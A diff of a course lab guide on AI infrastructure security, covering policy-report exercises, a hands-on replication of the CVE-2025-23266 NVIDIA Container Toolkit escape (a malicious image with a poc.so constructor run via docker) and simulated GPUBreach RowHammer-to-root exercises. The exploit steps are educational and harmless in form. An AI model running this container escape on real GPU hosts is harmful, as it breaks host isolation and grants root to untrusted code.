@@ -1,29 +1,33 @@
 
-# W1D6 - Securing AI Infrastructure: From Documents to Exploits
+# Day 6 — Securing AI Infrastructure: From Documents to Exploits
 
-This final day combines policy analysis, vulnerability research, and hands-on attack chain exploration to understand AI infrastructure security across multiple dimensions. You'll analyze three foundational security documents, exploit a real container escape vulnerability discovered by Wiz, and implement the complete GPUBreach attack chain.
+Day 6 combines policy analysis, vulnerability research, and hands-on attack-chain
+exploration to understand AI infrastructure security across multiple dimensions.
+You'll analyze three foundational security documents, exploit a real container
+escape vulnerability discovered by Wiz, and explore a hypothetical, composite
+GPUBreach simulator inspired by published GPU and RowHammer research.
 
 ## Table of Contents
 
 - [Content & Learning Objectives](#content--learning-objectives)
-    - [1️⃣ Document Analysis Discussion (2 hours)](#1️⃣-document-analysis-discussion-2-hours)
-    - [2️⃣ CVE-2025-23266 Hands-On Lab (45 minutes)](#2️⃣-cve-2025-23266-hands-on-lab-45-minutes)
-    - [3️⃣ GPUBreach Attack Chain (3+ hours)](#3️⃣-gpubreach-attack-chain-3-hours)
+    - [Section 6.1: Document Analysis Discussion (2 hours)](#section-61-document-analysis-discussion-2-hours)
+    - [Section 6.2: CVE-2025-23266 Hands-On Lab (45 minutes)](#section-62-cve-2025-23266-hands-on-lab-45-minutes)
+    - [Section 6.3: GPUBreach Attack Chain (3+ hours)](#section-63-gpubreach-attack-chain-3-hours)
 - [Setup](#setup)
-- [1️⃣ Document Analysis Discussion (2 hours)](#1️⃣-document-analysis-discussion-2-hours-1)
+- [Section 6.1: Document Analysis Discussion (2 hours)](#section-61-document-analysis-discussion-2-hours-1)
     - [Required Reading Materials](#required-reading-materials)
     - [Quick Reference Guide](#quick-reference-guide)
     - [Part 1: RAND Framework - Understanding the Threat Landscape (40 minutes)](#part-1-rand-framework---understanding-the-threat-landscape-40-minutes)
-        - [Exercise 1.1: Operational Capability Classification](#exercise-11-operational-capability-classification)
-        - [Exercise 1.2: Security Level Mapping](#exercise-12-security-level-mapping)
+        - [Exercise 6.1.1: Operational Capability Classification](#exercise-611-operational-capability-classification)
+        - [Exercise 6.1.2: Security Level Mapping](#exercise-612-security-level-mapping)
     - [Part 2: IAPS Data Center Security - Critical Attack Vectors (35 minutes)](#part-2-iaps-data-center-security---critical-attack-vectors-35-minutes)
-        - [Exercise 2.1: Attack Vector Prioritization](#exercise-21-attack-vector-prioritization)
-        - [Exercise 2.2: IAPS Policy Framework Implementation](#exercise-22-iaps-policy-framework-implementation)
+        - [Exercise 6.1.3: Attack Vector Prioritization](#exercise-613-attack-vector-prioritization)
+        - [Exercise 6.1.4: IAPS Policy Framework Implementation](#exercise-614-iaps-policy-framework-implementation)
     - [Part 3: SL5 Novel Recommendations - Next-Generation Controls (35 minutes)](#part-3-sl5-novel-recommendations---next-generation-controls-35-minutes)
-        - [Exercise 3.1: Five-Domain Architecture Analysis](#exercise-31-five-domain-architecture-analysis)
-        - [Exercise 3.2: SL5 Implementation Feasibility Assessment](#exercise-32-sl5-implementation-feasibility-assessment)
+        - [Exercise 6.1.5: Five-Domain Architecture Analysis](#exercise-615-five-domain-architecture-analysis)
+        - [Exercise 6.1.6: SL5 Implementation Feasibility Assessment](#exercise-616-sl5-implementation-feasibility-assessment)
     - [Synthesis Exercise: Cross-Report Integration (10 minutes)](#synthesis-exercise-cross-report-integration-10-minutes)
-- [2️⃣ CVE-2025-23266 Hands-On Lab: NVIDIA Container Toolkit Escape (45 minutes)](#2️⃣-cve-2025-23266-hands-on-lab-nvidia-container-toolkit-escape-45-minutes)
+- [Section 6.2: CVE-2025-23266 Hands-On Lab: NVIDIA Container Toolkit Escape (45 minutes)](#section-62-cve-2025-23266-hands-on-lab-nvidia-container-toolkit-escape-45-minutes)
     - [What you are exploiting](#what-you-are-exploiting)
     - [Prerequisites](#prerequisites)
     - [Setup](#setup-1)
@@ -35,44 +39,44 @@ This final day combines policy analysis, vulnerability research, and hands-on at
     - [Host setup (for self-testing)](#host-setup-for-self-testing)
     - [Troubleshooting](#troubleshooting)
     - [Security takeaway](#security-takeaway)
-- [3️⃣ GPUBreach Attack Chain: RowHammer to Root (3+ hours)](#3️⃣-gpubreach-attack-chain-rowhammer-to-root-3-hours)
+- [Section 6.3: GPUBreach Attack Chain: RowHammer to Root (3+ hours)](#section-63-gpubreach-attack-chain-rowhammer-to-root-3-hours)
     - [Phase 1 — Understanding the chain (no code, 30 minutes)](#phase-1-—-understanding-the-chain-no-code-30-minutes)
     - [Phase 2 — Must-finish: driving the attack to root](#phase-2-—-must-finish-driving-the-attack-to-root)
     - [Phase 3 — Stretch: digging into the primitives](#phase-3-—-stretch-digging-into-the-primitives)
     - [Phase 4 — Debrief (discussion)](#phase-4-—-debrief-discussion)
 - [Initial environment inspection](#initial-environment-inspection)
 - [Simulator cheat sheet](#simulator-cheat-sheet)
-- [1️⃣ Phase 1 — Understanding (30 min, no code)](#1️⃣-phase-1-—-understanding-30-min-no-code)
-    - [Exercise 1.1: DRAM row organisation and the RowHammer threshold](#exercise-11-dram-row-organisation-and-the-rowhammer-threshold)
-    - [Exercise 1.2: GPU PTEs and the aperture bit](#exercise-12-gpu-ptes-and-the-aperture-bit)
-    - [Exercise 1.3: Why the IOMMU does not block this write](#exercise-13-why-the-iommu-does-not-block-this-write)
-    - [Exercise 1.4: Driver OOB → privilege escalation](#exercise-14-driver-oob-→-privilege-escalation)
-- [2️⃣ Phase 2 — Must-finish: driving the attack to root](#2️⃣-phase-2-—-must-finish-driving-the-attack-to-root)
-    - [Exercise 2.1: Aggressor rows for double-sided hammering](#exercise-21-aggressor-rows-for-double-sided-hammering)
-    - [Exercise 2.2: Hammer until a bit flips](#exercise-22-hammer-until-a-bit-flips)
-    - [Exercise 2.3: Force the MMU to re-walk the flipped PTE](#exercise-23-force-the-mmu-to-re-walk-the-flipped-pte)
-    - [Exercise 2.4: Craft the OOB DMA payload](#exercise-24-craft-the-oob-dma-payload)
-    - [Exercise 2.5: Fire the DMA and confirm root](#exercise-25-fire-the-dma-and-confirm-root)
+- [Phase 1 — Understanding (30 min, no code)](#phase-1-—-understanding-30-min-no-code)
+    - [Exercise 6.3.1: DRAM row organisation and the RowHammer threshold](#exercise-631-dram-row-organisation-and-the-rowhammer-threshold)
+    - [Exercise 6.3.2: GPU PTEs and the aperture bit](#exercise-632-gpu-ptes-and-the-aperture-bit)
+    - [Exercise 6.3.3: Why the IOMMU does not block this write](#exercise-633-why-the-iommu-does-not-block-this-write)
+    - [Exercise 6.3.4: Driver OOB → privilege escalation](#exercise-634-driver-oob-→-privilege-escalation)
+- [Phase 2 — Must-finish: driving the attack to root](#phase-2-—-must-finish-driving-the-attack-to-root-1)
+    - [Exercise 6.3.5: Aggressor rows for double-sided hammering](#exercise-635-aggressor-rows-for-double-sided-hammering)
+    - [Exercise 6.3.6: Hammer until a bit flips](#exercise-636-hammer-until-a-bit-flips)
+    - [Exercise 6.3.7: Force the MMU to re-walk the flipped PTE](#exercise-637-force-the-mmu-to-re-walk-the-flipped-pte)
+    - [Exercise 6.3.8: Craft the OOB DMA payload](#exercise-638-craft-the-oob-dma-payload)
+    - [Exercise 6.3.9: Fire the DMA and confirm root](#exercise-639-fire-the-dma-and-confirm-root)
     - [Print the flag](#print-the-flag)
-- [3️⃣ Phase 3 — Stretch: digging into the primitives (Optional)](#3️⃣-phase-3-—-stretch-digging-into-the-primitives-optional)
-    - [Exercise 3.1 (Optional): Decode a PTE by hand](#exercise-31-optional-decode-a-pte-by-hand)
-    - [Exercise 3.2 (Optional): Inspect the exact flipped bit](#exercise-32-optional-inspect-the-exact-flipped-bit)
-    - [Exercise 3.3 (Optional): Budget the hammer against the refresh window](#exercise-33-optional-budget-the-hammer-against-the-refresh-window)
-    - [Exercise 3.4 (Optional): Maximum hammer rounds inside the window](#exercise-34-optional-maximum-hammer-rounds-inside-the-window)
-    - [Exercise 3.5 (Optional): The IOMMU blocks what it promises to block](#exercise-35-optional-the-iommu-blocks-what-it-promises-to-block)
-    - [Exercise 3.6 (Optional): Measure the OOB overflow precisely](#exercise-36-optional-measure-the-oob-overflow-precisely)
-    - [Exercise 3.7 (Optional): A tighter payload](#exercise-37-optional-a-tighter-payload)
+- [Phase 3 — Stretch: digging into the primitives (Optional)](#phase-3-—-stretch-digging-into-the-primitives-optional)
+    - [Exercise 6.3.10 (Optional): Decode a PTE by hand](#exercise-6310-optional-decode-a-pte-by-hand)
+    - [Exercise 6.3.11 (Optional): Inspect the exact flipped bit](#exercise-6311-optional-inspect-the-exact-flipped-bit)
+    - [Exercise 6.3.12 (Optional): Budget the hammer against the refresh window](#exercise-6312-optional-budget-the-hammer-against-the-refresh-window)
+    - [Exercise 6.3.13 (Optional): Maximum hammer rounds inside the window](#exercise-6313-optional-maximum-hammer-rounds-inside-the-window)
+    - [Exercise 6.3.14 (Optional): The IOMMU blocks what it promises to block](#exercise-6314-optional-the-iommu-blocks-what-it-promises-to-block)
+    - [Exercise 6.3.15 (Optional): Measure the OOB overflow precisely](#exercise-6315-optional-measure-the-oob-overflow-precisely)
+    - [Exercise 6.3.16 (Optional): A tighter payload](#exercise-6316-optional-a-tighter-payload)
 - [GPUBreach Summary](#gpubreach-summary)
     - [Key Takeaways](#key-takeaways)
     - [Further Reading](#further-reading)
-- [Final Summary](#final-summary)
+- [Day 6 Summary](#day-6-summary)
     - [Key Takeaways](#key-takeaways-1)
     - [Implementation Priorities for Your Organization](#implementation-priorities-for-your-organization)
     - [Further Reading](#further-reading-1)
 
 ## Content & Learning Objectives
 
-### 1️⃣ Document Analysis Discussion (2 hours)
+### Section 6.1: Document Analysis Discussion (2 hours)
 Deep analysis of three foundational reports covering threat frameworks, data center security, and novel defensive approaches.
 
 > **Learning Objectives**
@@ -80,7 +84,7 @@ Deep analysis of three foundational reports covering threat frameworks, data cen
 > - Analyze critical attack vectors in AI data center environments
 > - Assess implementation feasibility of next-generation security controls
 
-### 2️⃣ CVE-2025-23266 Hands-On Lab (45 minutes)
+### Section 6.2: CVE-2025-23266 Hands-On Lab (45 minutes)
 Replicate the NVIDIA Container Toolkit container escape (NVIDIAScape) discovered by Wiz Research — build a malicious image, preload a payload into the privileged `nvidia-ctk` hook, and write a file on the host as root.
 
 > **Learning Objectives**
@@ -88,8 +92,10 @@ Replicate the NVIDIA Container Toolkit container escape (NVIDIAScape) discovered
 > - Trigger the vulnerable `createContainer` hook with `--runtime=nvidia --gpus=all`
 > - Observe host-side code execution outside container isolation
 
-### 3️⃣ GPUBreach Attack Chain (3+ hours)
-Complete implementation of a GPU-based privilege escalation chain combining RowHammer, aperture bit flipping, IOMMU bypass, and kernel exploitation.
+### Section 6.3: GPUBreach Attack Chain (3+ hours)
+Simulation of a GPU-based privilege-escalation chain combining RowHammer,
+aperture-bit corruption, a sub-page out-of-bounds DMA write within a legitimate
+IOMMU mapping, and kernel credential corruption.
 
 > **Learning Objectives**
 > - Execute end-to-end GPU-based attack chains
@@ -108,7 +114,7 @@ If you see a code snippet here in the instruction file, copy-paste it into your 
 
 ---
 
-## 1️⃣ Document Analysis Discussion (2 hours)
+## Section 6.1: Document Analysis Discussion (2 hours)
 
 This discussion session guides you through three foundational reports on AI infrastructure security. You'll work through specific sections of each document to understand threat frameworks, security implementations, and novel defensive approaches.
 
@@ -153,7 +159,7 @@ This discussion session guides you through three foundational reports on AI infr
 
 ### Part 1: RAND Framework - Understanding the Threat Landscape (40 minutes)
 
-#### Exercise 1.1: Operational Capability Classification
+#### Exercise 6.1.1: Operational Capability Classification
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵🔵
@@ -184,7 +190,7 @@ This discussion session guides you through three foundational reports on AI infr
 
 </blockquote></details>
 
-#### Exercise 1.2: Security Level Mapping
+#### Exercise 6.1.2: Security Level Mapping
 
 > **Difficulty**: 🔴🔴🔴⚪⚪
 > **Importance**: 🔵🔵🔵🔵⚪
@@ -223,7 +229,7 @@ This discussion session guides you through three foundational reports on AI infr
 
 ### Part 2: IAPS Data Center Security - Critical Attack Vectors (35 minutes)
 
-#### Exercise 2.1: Attack Vector Prioritization
+#### Exercise 6.1.3: Attack Vector Prioritization
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵🔵
@@ -267,7 +273,7 @@ This discussion session guides you through three foundational reports on AI infr
 
 </blockquote></details>
 
-#### Exercise 2.2: IAPS Policy Framework Implementation
+#### Exercise 6.1.4: IAPS Policy Framework Implementation
 
 > **Difficulty**: 🔴🔴🔴⚪⚪
 > **Importance**: 🔵🔵🔵⚪⚪
@@ -313,7 +319,7 @@ This discussion session guides you through three foundational reports on AI infr
 
 ### Part 3: SL5 Novel Recommendations - Next-Generation Controls (35 minutes)
 
-#### Exercise 3.1: Five-Domain Architecture Analysis
+#### Exercise 6.1.5: Five-Domain Architecture Analysis
 
 > **Difficulty**: 🔴🔴🔴🔴⚪
 > **Importance**: 🔵🔵🔵🔵🔵
@@ -361,7 +367,7 @@ This discussion session guides you through three foundational reports on AI infr
 
 </blockquote></details>
 
-#### Exercise 3.2: SL5 Implementation Feasibility Assessment
+#### Exercise 6.1.6: SL5 Implementation Feasibility Assessment
 
 > **Difficulty**: 🔴🔴🔴🔴🔵
 > **Importance**: 🔵🔵🔵🔵⚪
@@ -442,7 +448,7 @@ This discussion session guides you through three foundational reports on AI infr
 
 ---
 
-## 2️⃣ CVE-2025-23266 Hands-On Lab: NVIDIA Container Toolkit Escape (45 minutes)
+## Section 6.2: CVE-2025-23266 Hands-On Lab: NVIDIA Container Toolkit Escape (45 minutes)
 
 This is a hacking exercise. You will replicate [NVIDIAScape](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape) — CVE-2025-23266 in NVIDIA Container Toolkit ≤ 1.17.7 — and escape from a GPU container to execute arbitrary code on the host as root.
 
@@ -459,7 +465,7 @@ docker run --runtime=nvidia --gpus=all <malicious-image>
   → hook cwd is container root filesystem
   → /proc/self/cwd/poc.so resolves to attacker's library in the image
   → poc.so constructor runs on the HOST with hook privileges
-  → write /tmp/output-<yourname> (or any host path)
+  → write /tmp/output-{yourname} (or any host path)
 ```
 
 **Key resources:**
@@ -476,21 +482,20 @@ docker run --runtime=nvidia --gpus=all <malicious-image>
 | Regular user (non-root) | Exploit must work without sudo |
 | `gcc`, `make`, `docker` | For building `poc.so` and the image |
 
-<!-- FIXME: is there a course lab machine for this? -->
 On the **course lab machine**, a vulnerable stack is pre-installed — do **not** install or upgrade NVIDIA packages.
 
 ### Setup
 
 ```bash
 cd day6-infrastructure/module1
-cp -r test day6-nvidia-<yourname>    # e.g. day6-nvidia-guava
-cd day6-nvidia-<yourname>
+cp -r test day6-nvidia-{yourname}    # e.g. day6-nvidia-guava
+cd day6-nvidia-{yourname}
 ```
 
 You should have:
 
 ```
-day6-nvidia-<yourname>/
+day6-nvidia-{yourname}/
 ├── poc.c        # your payload (edit this)
 ├── Dockerfile   # malicious image (edit this)
 └── Makefile     # builds poc.so and Docker image
@@ -518,7 +523,7 @@ void __attribute__((constructor)) init(void) {
     strcat(message, "\n");
 
     // Use a UNIQUE filename for your pair/team
-    int fd = open("/tmp/output-<yourname>", O_WRONLY | O_CREAT | O_APPEND, 0644);
+    int fd = open("/tmp/output-{yourname}", O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (fd != -1) {
         write(fd, message, strlen(message));
         close(fd);
@@ -526,7 +531,7 @@ void __attribute__((constructor)) init(void) {
 }
 ```
 
-Replace `<yourname>` with something unique (e.g. `output-guava`, `output-pranav`).
+Replace `{yourname}` with something unique (e.g. `output-guava`, `output-pranav`).
 
 ### Step 2: Write `Dockerfile`
 
@@ -565,9 +570,9 @@ docker images nvidia-ctk-image
 Simulate loading your library into `nvidia-ctk` directly:
 
 ```bash
-rm -f /tmp/output-<yourname>
+rm -f /tmp/output-{yourname}
 LD_PRELOAD=./poc.so nvidia-ctk --version
-cat /tmp/output-<yourname>
+cat /tmp/output-{yourname}
 ```
 
 Expected:
@@ -581,20 +586,20 @@ This confirms the payload works. It does **not** prove the full container escape
 ### Step 5: Run the exploit
 
 ```bash
-rm -f /tmp/output-<yourname>
+rm -f /tmp/output-{yourname}
 
 docker run --rm --runtime=nvidia --gpus=all nvidia-ctk-image echo hello
 
-ls -l /tmp/output-<yourname>
-cat /tmp/output-<yourname>
+ls -l /tmp/output-{yourname}
+cat /tmp/output-{yourname}
 ```
 
-**Success:** `/tmp/output-<yourname>` exists **on the host** after the container exits, even though you ran Docker as a regular user. The container only printed `hello`; the escape happened in the privileged hook before the container process started.
+**Success:** `/tmp/output-{yourname}` exists **on the host** after the container exits, even though you ran Docker as a regular user. The container only printed `hello`; the escape happened in the privileged hook before the container process started.
 
 Clean up:
 
 ```bash
-sudo rm /tmp/output-<yourname>
+sudo rm /tmp/output-{yourname}
 ```
 
 ### Host setup (for self-testing)
@@ -625,7 +630,7 @@ Default on patched installs is `cuda-compat-mode = "ldconfig"`, which does not u
 
 ---
 
-## 3️⃣ GPUBreach Attack Chain: RowHammer to Root (3+ hours)
+## Section 6.3: GPUBreach Attack Chain: RowHammer to Root (3+ hours)
 
 In this lab you will walk through the *GPUBreach* attack chain end-to-end against a simulated GDDR6 + NVIDIA-style driver stack. The chain fuses several well-known primitives into a single full-system compromise:
 
@@ -799,14 +804,14 @@ Every call above is backed by a short docstring inside `gpubreach_sim/`
 if you want to see what it does exactly.
 
 
-## 1️⃣ Phase 1 — Understanding (30 min, no code)
+## Phase 1 — Understanding (30 min, no code)
 
 Read each of the four comprehension exercises below and answer the
 questions (plain-text comments in your answers file are fine). The
 collapsed reference answers are there for when you finish, not to short-
 circuit your thinking.
 
-### Exercise 1.1: DRAM row organisation and the RowHammer threshold
+### Exercise 6.3.1: DRAM row organisation and the RowHammer threshold
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵🔵
@@ -855,7 +860,7 @@ When this lab says "64ms refresh window" it means tREFW.
 </blockquote></details>
 
 
-### Exercise 1.2: GPU PTEs and the aperture bit
+### Exercise 6.3.2: GPU PTEs and the aperture bit
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵🔵
@@ -892,7 +897,7 @@ The coincidence is engineered, not luck. In this lab
 </blockquote></details>
 
 
-### Exercise 1.3: Why the IOMMU does not block this write
+### Exercise 6.3.3: Why the IOMMU does not block this write
 
 > **Difficulty**: 🔴🔴🔴⚪⚪
 > **Importance**: 🔵🔵🔵🔵🔵
@@ -923,7 +928,7 @@ not enforce intra-page bounds inside a legitimately mapped page.
 </blockquote></details>
 
 
-### Exercise 1.4: Driver OOB → privilege escalation
+### Exercise 6.3.4: Driver OOB → privilege escalation
 
 > **Difficulty**: 🔴🔴🔴⚪⚪
 > **Importance**: 🔵🔵🔵🔵⚪
@@ -958,7 +963,7 @@ not PCIe DMA).
 </blockquote></details>
 
 
-## 2️⃣ Phase 2 — Must-finish: driving the attack to root
+## Phase 2 — Must-finish: driving the attack to root
 
 Five tiny coding exercises — one for each step in the chain. Each has a
 test you run immediately after. Budget ~30–45 minutes total. At the end,
@@ -1000,10 +1005,10 @@ Ex 2.5: root achieved? True
 
 If Phase 2 is taking **minutes** instead of **milliseconds**, you almost
 certainly have a `|a - b| ≠ 2` bug in `find_aggressors` — double-check
-Exercise 2.1 before anything else.
+Exercise 6.3.5 before anything else.
 
 
-### Exercise 2.1: Aggressor rows for double-sided hammering
+### Exercise 6.3.5: Aggressor rows for double-sided hammering
 
 > **Difficulty**: 🔴⚪⚪⚪⚪
 > **Importance**: 🔵🔵🔵⚪⚪
@@ -1032,7 +1037,7 @@ test_find_aggressors(find_aggressors)
 env.stage1_aggressors_ok = True
 ```
 
-### Exercise 2.2: Hammer until a bit flips
+### Exercise 6.3.6: Hammer until a bit flips
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵⚪
@@ -1075,7 +1080,7 @@ env.stage2_flipped_in_refresh_window = (
 )
 ```
 
-### Exercise 2.3: Force the MMU to re-walk the flipped PTE
+### Exercise 6.3.7: Force the MMU to re-walk the flipped PTE
 
 > **Difficulty**: 🔴⚪⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵⚪
@@ -1112,7 +1117,7 @@ env.stage3_aperture_changed = (before, after) == (
 )
 ```
 
-### Exercise 2.4: Craft the OOB DMA payload
+### Exercise 6.3.8: Craft the OOB DMA payload
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵🔵
@@ -1152,7 +1157,7 @@ from day6_final_test import test_craft_overflow_payload
 test_craft_overflow_payload(craft_overflow_payload)
 ```
 
-### Exercise 2.5: Fire the DMA and confirm root
+### Exercise 6.3.9: Fire the DMA and confirm root
 
 > **Difficulty**: 🔴⚪⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵🔵
@@ -1200,11 +1205,11 @@ Otherwise it tells you which stage still needs work.
 env.check_all()
 ```
 
-## 3️⃣ Phase 3 — Stretch: digging into the primitives (Optional)
+## Phase 3 — Stretch: digging into the primitives (Optional)
 
 Optional exercises for deeper understanding. Each is short and independent.
 
-### Exercise 3.1 (Optional): Decode a PTE by hand
+### Exercise 6.3.10 (Optional): Decode a PTE by hand
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵⚪⚪
@@ -1237,7 +1242,7 @@ from day6_final_test import test_decode_pte_manually
 test_decode_pte_manually(decode_pte_manually)
 ```
 
-### Exercise 3.2 (Optional): Inspect the exact flipped bit
+### Exercise 6.3.11 (Optional): Inspect the exact flipped bit
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵⚪⚪
@@ -1272,7 +1277,7 @@ from day6_final_test import test_find_flipped_bits
 test_find_flipped_bits(find_flipped_bits)
 ```
 
-### Exercise 3.3 (Optional): Budget the hammer against the refresh window
+### Exercise 6.3.12 (Optional): Budget the hammer against the refresh window
 
 > **Difficulty**: 🔴⚪⚪⚪⚪
 > **Importance**: 🔵🔵🔵⚪⚪
@@ -1312,7 +1317,7 @@ from day6_final_test import test_hammer_budget
 test_hammer_budget(hammer_budget)
 ```
 
-### Exercise 3.4 (Optional): Maximum hammer rounds inside the window
+### Exercise 6.3.13 (Optional): Maximum hammer rounds inside the window
 
 > **Difficulty**: 🔴⚪⚪⚪⚪
 > **Importance**: 🔵🔵🔵⚪⚪
@@ -1341,7 +1346,7 @@ from day6_final_test import test_max_rounds_in_window
 test_max_rounds_in_window(max_rounds_in_window)
 ```
 
-### Exercise 3.5 (Optional): The IOMMU blocks what it promises to block
+### Exercise 6.3.14 (Optional): The IOMMU blocks what it promises to block
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵🔵⚪
@@ -1377,7 +1382,7 @@ from day6_final_test import test_probe_iommu
 test_probe_iommu(probe_iommu)
 ```
 
-### Exercise 3.6 (Optional): Measure the OOB overflow precisely
+### Exercise 6.3.15 (Optional): Measure the OOB overflow precisely
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵⚪⚪
@@ -1402,12 +1407,12 @@ from day6_final_test import test_overflow_bytes
 test_overflow_bytes(overflow_bytes)
 ```
 
-### Exercise 3.7 (Optional): A tighter payload
+### Exercise 6.3.16 (Optional): A tighter payload
 
 > **Difficulty**: 🔴🔴⚪⚪⚪
 > **Importance**: 🔵🔵🔵⚪⚪
 
-The payload in Exercise 2.4 overshoots — it writes 132 bytes where 132 is
+The payload in Exercise 6.3.8 overshoots — it writes 132 bytes where 132 is
 exactly `DRIVER_BUFFER_SIZE + 4`. What if the cred struct's euid field
 isn't at the very start of the overflow region, but at some `offset`
 past `CRED_OFFSET`? Write a parameterised payload builder.
@@ -1442,7 +1447,7 @@ You implemented an end-to-end GPUBreach-style attack chain:
 
 1. **RowHammer** - Flipped a GPU DRAM bit within the refresh window
 2. **Aperture corruption** - Redirected GPU virtual address from VRAM to system memory
-3. **IOMMU bypass** - Leveraged legitimate page mapping for malicious DMA
+3. **Sub-page isolation failure** - Abused an out-of-bounds write within a legitimately mapped IOMMU page
 4. **Privilege escalation** - Overwrote kernel credentials via buffer overflow
 
 ### Key Takeaways
@@ -1460,7 +1465,7 @@ You implemented an end-to-end GPUBreach-style attack chain:
 
 ---
 
-## Final Summary
+## Day 6 Summary
 
 This comprehensive day covered three critical dimensions of AI infrastructure security:
 
@@ -1469,8 +1474,8 @@ This comprehensive day covered three critical dimensions of AI infrastructure se
 - **RAND framework**: OC1-OC5 threat actors and SL1-SL5 progressive controls give a structured way to match defenses to adversary capability. Model weights are uniquely sensitive — unlike traditional IP, they are immediately executable and high-value at terabyte scale.
 - **IAPS policy lens**: Three critical attack vectors (side-channel, supply chain, weight exfiltration) and a four-point policy framework (standards, R&D, intelligence sharing, supply chain decoupling) coordinate government-industry response. Current data center practices are insufficient for AI-specific threats.
 - **SL5 novel controls**: Five security domains (supply chain, network, machine, physical, personnel) require coordinated novel approaches. Reaching SL5 demands a *radical reduction* in trusted hardware/software components, and the document's 3-6 month feasibility assessment is the practical entry point for planning.
-- **Vulnerability Research**: CVE-2025-23266 hands-on lab shows how `LD_PRELOAD` container escapes break trust-boundary assumptions in GPU container runtimes — namespaces/cgroups/seccomp don't protect host-side toolkit execution.
-- **Attack Chain Implementation**: GPUBreach chains RowHammer → aperture bit flip → IOMMU bypass → kernel cred overwrite. Single bit flips in PTEs change memory-access semantics, and the IOMMU's page granularity leaves sub-page OOB writes unblocked.
+- **Vulnerability Research**: the CVE-2025-23266 hands-on lab shows how `LD_PRELOAD` container escapes break trust-boundary assumptions in GPU container runtimes — namespaces/cgroups/seccomp don't protect host-side toolkit execution.
+- **Attack Chain Simulation**: the hypothetical GPUBreach chain combines RowHammer → aperture bit flip → sub-page OOB DMA → kernel credential overwrite. The IOMMU authorizes the mapped page as designed; the simulated failure is software-managed object bounds within that page.
 
 ### Implementation Priorities for Your Organization
 
@@ -1482,21 +1487,21 @@ This comprehensive day covered three critical dimensions of AI infrastructure se
 ### Further Reading
 
 **Policy and Framework Documents:**
-- RAND Corporation: "Securing AI Model Weights" - https://www.rand.org/content/dam/rand/pubs/research_reports/RRA2800/RRA2849-1/RAND_RRA2849-1.pdf
-- IAPS Research: "Accelerating AI Data Center Security" - https://www.iaps.ai/research/accelerating-ai-data-center-security
-- NIST AI Risk Management Framework - https://www.nist.gov/itl/ai-risk-management-framework
+- [RAND Corporation: *Securing AI Model Weights*](https://www.rand.org/content/dam/rand/pubs/research_reports/RRA2800/RRA2849-1/RAND_RRA2849-1.pdf)
+- [IAPS Research: *Accelerating AI Data Center Security*](https://www.iaps.ai/research/accelerating-ai-data-center-security)
+- [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework)
 
 **Vulnerability Research:**
-- Wiz CVE-2025-23266 Analysis - https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape
-- NVIDIA Security Advisories - https://www.nvidia.com/en-us/security/
-- Container Escape Techniques - OWASP Container Security Guide
+- [Wiz CVE-2025-23266 analysis](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape)
+- [NVIDIA security advisories](https://www.nvidia.com/en-us/security/)
+- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
 
 **GPU Security Research:**
-- GPUHammer: RowHammer Attacks on GPU Memories - https://gpuhammer.com/
-- GPU Side-Channel Attacks - https://leakcanary.net/
-- AI Hardware Security - https://aivillage.org/large%20language%20models/threat-modeling-llm/
+- [GPUHammer: RowHammer Attacks on GPU Memories](https://gpuhammer.com/)
+- [GPU side-channel attacks](https://leakcanary.net/)
+- [AI hardware security threat modeling](https://aivillage.org/large%20language%20models/threat-modeling-llm/)
 
 **Implementation Resources:**
-- NVIDIA Container Toolkit Security Guide
-- Kubernetes GPU Device Plugin Security
-- Docker Security Best Practices for AI Workloads
+- [NVIDIA Container Toolkit documentation](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/)
+- [Kubernetes device-plugin documentation](https://kubernetes.io/docs/concepts/extend-kubernetes/compute-storage-net/device-plugins/)
+- [Docker Engine security documentation](https://docs.docker.com/engine/security/)
